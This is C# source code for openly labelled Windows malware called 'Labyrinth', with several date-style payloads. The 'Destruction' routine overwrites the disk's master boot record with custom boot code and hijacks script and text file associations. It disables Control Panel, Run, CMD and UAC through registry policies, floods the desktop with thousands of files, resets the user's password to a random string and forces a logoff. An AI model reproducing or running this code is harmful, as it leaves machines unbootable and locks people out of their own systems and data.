using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Media;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Labyrinth
{
    class Payload
    {

        #region Variables
        const string malName = "Labyrinth";
        const string malFolder = @"C:\Program Files\" + malName;
        static string malHost = Environment.GetEnvironmentVariable("windir") + "\\winupdatex64.exe";
        #region MBR
        static byte[] mbrData =
       {
        0xEB, 0x00, 0xE8, 0x1F, 0x00, 0x8C, 0xC8, 0x8E, 0xD8, 0xBE, 0x33, 0x7C, 0xE8, 0x00, 0x00, 0x50,
        0xFC, 0x8A, 0x04, 0x3C, 0x00, 0x74, 0x06, 0xE8, 0x05, 0x00, 0x46, 0xEB, 0xF4, 0xEB, 0xFE, 0xB4,
        0x0E, 0xCD, 0x10, 0xC3, 0xB4, 0x07, 0xB0, 0x00, 0xB7, 0x1F, 0xB9, 0x00, 0x00, 0xBA, 0x4F, 0x18,
        0xCD, 0x10, 0xC3, 0x54, 0x68, 0x69, 0x73, 0x20, 0x63, 0x6F, 0x6D, 0x70, 0x75, 0x74, 0x65, 0x72,
        0x20, 0x68, 0x61, 0x73, 0x20, 0x62, 0x65, 0x65, 0x6E, 0x20, 0x74, 0x72, 0x61, 0x73, 0x68, 0x65,
        0x64, 0x20, 0x62, 0x79, 0x20, 0x56, 0x69, 0x72, 0x75, 0x73, 0x2E, 0x57, 0x69, 0x6E, 0x33, 0x32,
        0x2E, 0x4C, 0x61, 0x62, 0x79, 0x72, 0x69, 0x6E, 0x74, 0x68, 0x0D, 0x0A, 0x50, 0x6C, 0x65, 0x61,
        0x73, 0x65, 0x20, 0x72, 0x65, 0x69, 0x6E, 0x73, 0x74, 0x61, 0x6C, 0x6C, 0x20, 0x79, 0x6F, 0x75,
        0x72, 0x20, 0x63, 0x6F, 0x70, 0x79, 0x20, 0x6F, 0x66, 0x20, 0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77,
        0x73, 0x2E, 0x0D, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
       };
        #endregion
        #endregion
        #region DLL Imports
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CreateFile(
        [MarshalAs(UnmanagedType.LPTStr)] string filename,
        [MarshalAs(UnmanagedType.U4)] FileAccess access,
        [MarshalAs(UnmanagedType.U4)] FileShare share,
        IntPtr securityAttributes,
        [MarshalAs(UnmanagedType.U4)] FileMode creationDisposition,
        [MarshalAs(UnmanagedType.U4)] FileAttributes flagsAndAttributes,
        IntPtr templateFile);

        [DllImport("kernel32.dll")]
        static extern bool WriteFile(IntPtr hFile, byte[] lpBuffer,
        uint nNumberOfBytesToWrite, out uint lpNumberOfBytesWritten,
        [In] ref NativeOverlapped lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CloseHandle(IntPtr hObject);
        #endregion
        #region Payloads

        #region Payload 1: 4/20
        public static void WeedDay()
        {
            Wallpaper.Set(new Uri(malFolder + "\\w.png"), Wallpaper.Style.Stretched);
            MessageBox.Show("Happy 4/20!", malName, MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        #endregion
        #region Payload 2: Go Outside Day in Canada
        public static void GoOutside()
        {
            Misc.HookExe(malHost);
            MessageBox.Show("Today is Go Outside Day in Canada, I don't care if you live there or not, Go outside and play!", malName, MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        #endregion
        #region Payload 3: Winfig
        public static void Winfig()
        {
            Wallpaper.Set(new Uri(malFolder + "\\f.bmp"), Wallpaper.Style.Tiled);
        }
        #endregion
        #region Payload 4: Destruction
        public static void Destruction()
        {
            new SoundPlayer(malFolder + "\\c.wav").PlayLooping();
            string trashHook = Environment.GetEnvironmentVariable("systemdrive") + "\\haha.exe";
            File.WriteAllText(trashHook, Misc.RString(666));


            for (int i = 0; i <=  6666; i++) File.Create(Environment.GetEnvironmentVariable("userprofile") + "\\Desktop\\" + "elmo " + i + ".txt");

            Misc.HookExe(trashHook);
            Registry.SetValue("HKEY_CLASSES_ROOT\\batfile\\shell\\open\\command", "", trashHook);
            Registry.SetValue("HKEY_CLASSES_ROOT\\batfile\\shell\\edit\\command", "", trashHook);
            Registry.SetValue("HKEY_CLASSES_ROOT\\cmdfile\\shell\\open\\command", "", trashHook);
            Registry.SetValue("HKEY_CLASSES_ROOT\\cmdfile\\shell\\edit\\command", "", trashHook);
            Registry.SetValue("HKEY_CLASSES_ROOT\\vbsfile\\shell\\open\\command", "", trashHook);
            Registry.SetValue("HKEY_CLASSES_ROOT\\vbsfile\\shell\\edit\\command", "", trashHook);
            Registry.SetValue("HKEY_CLASSES_ROOT\\piffile\\shell\\open\\command", "", trashHook);
            Registry.SetValue("HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command", "", trashHook);
            Registry.SetValue("HKEY_CLASSES_ROOT\\txtfile\\shell\\edit\\command", "", trashHook);
            Registry.SetValue("HKEY_CLASSES_ROOT\\scrfile\\shell\\config\\command", "", trashHook);
            Registry.SetValue("HKEY_CLASSES_ROOT\\scrfile\\shell\\install\\command", "", trashHook);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "LegalNoticeCaption", "NOTICE!", RegistryValueKind.String);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon", "LegalNoticeText", "Your computer has been trashed by Labyrinth. Please reboot your machine.", RegistryValueKind.String);
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoViewOnDrive", 0x3FFFFFF, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "NoDispAppearancePage", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "NoDispBackgroundPage", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "NoDispCPL", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "NoDispSettingsPage", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoControlPanel", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFileAssociate", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "Hidden", 2, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", "HideFileExt", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "TaskbarNoPinnedList", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoPinningToTaskbar", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoSetTaskbar", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoTrayItemsDisplay", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoSaveSettings", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableLockWorkstation", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", 0, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoStartMenuPinnedList", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoStartMenuMFUprogramsList", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoStartMenuMorePrograms", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFind", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoSecurityTab", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoSecurityTab", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Command Processor", "DisableUNCCheck", 1, RegistryValueKind.DWord);
            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableCMD", 1, RegistryValueKind.DWord);

            Wallpaper.Set(new Uri(malFolder + "\\t.png"), Wallpaper.Style.Stretched);

            ProcessStartInfo n = new ProcessStartInfo("net", "user " + Environment.UserName + " " + Misc.RString(8)); //generate random password for user account
            n.UseShellExecute = false;
            n.CreateNoWindow = true;
            Process.Start(n);

            IntPtr MBR = CreateFile(
                    "\\\\.\\PhysicalDrive0", FileAccess.ReadWrite, FileShare.ReadWrite,
                    IntPtr.Zero, FileMode.Open, 0, IntPtr.Zero
                    );
            NativeOverlapped NatOv = new NativeOverlapped();
            WriteFile(MBR, mbrData, 512, out uint write, ref NatOv); //overwrite mbr with our custom mbr data
            CloseHandle(MBR);

            MessageBox.Show("Well, I guess it's time for me to go, Nothing left for me here!\n\nVirus.Win32.Labyrinth\nWritten by: T3chyy\n\n'Screw you guys! I'm going home!'", malName, MessageBoxButtons.OK, MessageBoxIcon.Error);
            Misc.ExitWindowsEx(0 | 0x00000004, 0);
        }
        #endregion
        #endregion
        public sealed class Wallpaper
        {
            Wallpaper() { }

            const int SPI_SETDESKWALLPAPER = 20;
            const int SPIF_UPDATEINIFILE = 0x01;
            const int SPIF_SENDWININICHANGE = 0x02;

            [DllImport("user32.dll", CharSet = CharSet.Auto)]
            static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

            public enum Style : int
            {
                Tiled,
                Centered,
                Stretched
            }

            public static void Set(Uri uri, Style style)
            {
                Stream s = new WebClient().OpenRead(uri.ToString());

                Image img = Image.FromStream(s);
                string tempPath = Path.Combine(Path.GetTempPath(), "wallpaper.bmp");
                img.Save(tempPath, ImageFormat.Bmp);

                RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true);
                if (style == Style.Stretched)
                {
                    key.SetValue(@"WallpaperStyle", 2.ToString());
                    key.SetValue(@"TileWallpaper", 0.ToString());
                }

                if (style == Style.Centered)
                {
                    key.SetValue(@"WallpaperStyle", 1.ToString());
                    key.SetValue(@"TileWallpaper", 0.ToString());
                }

                if (style == Style.Tiled)
                {
                    key.SetValue(@"WallpaperStyle", 1.ToString());
                    key.SetValue(@"TileWallpaper", 1.ToString());
                }

                SystemParametersInfo(SPI_SETDESKWALLPAPER,
                    0,
                    tempPath,
                    SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
            }
        }
    }
}